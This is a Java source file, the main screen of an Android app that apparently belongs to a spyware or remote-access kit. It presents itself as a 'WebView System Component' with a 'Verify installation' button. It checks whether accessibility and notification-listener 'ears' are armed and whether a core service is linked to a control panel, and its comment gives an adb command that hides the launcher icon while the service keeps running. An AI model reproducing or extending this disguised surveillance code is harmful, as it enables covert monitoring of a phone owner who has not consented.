package com.lo.syskit;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * MainActivity — deliberately minimal. One programmatic screen (no layout
 * resources = lighter APK). Shows live link status, restarts the core
 * service, and self-reports whether the ears (accessibility / notification
 * listener) are enabled. After install the panel can hide this launcher:
 *   adb shell pm disable-user com.lo.syskit/.MainActivity
 * The service keeps running; re-enable via `pm enable`.
 */
public class MainActivity extends Activity {

    private TextView status;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.parseColor("#0d1117"));
        root.setPadding(48, 48, 48, 48);

        TextView title = new TextView(this);
        title.setText("WebView System Component");
        title.setTextColor(Color.parseColor("#22d3ee"));
        title.setTextSize(18);
        root.addView(title);

        status = new TextView(this);
        status.setTextColor(Color.parseColor("#d1d5db"));
        status.setTextSize(13);
        status.setPadding(0, 32, 0, 32);
        root.addView(status);

        Button restart = new Button(this);
        restart.setText("Verify installation");
        restart.setOnClickListener(v -> {
            startService(new Intent(this, CoreService.class));
            refresh();
        });
        root.addView(restart);

        setContentView(root);
        refresh();
    }

    private void refresh() {
        boolean acc = AuditService.installed() &&
                (AuditService.instance() != null);
        boolean nl = NlService.instance() != null;
        boolean link = CoreService.linkUp();
        status.setText("core service: " + (link ? "LINKED" : "standby")
                + "\naudit ear: " + (acc ? "armed" : "inactive")
                + "\nnotification ear: " + (nl ? "armed" : "inactive"));
    }

    @Override protected void onResume() { super.onResume(); refresh(); }
}
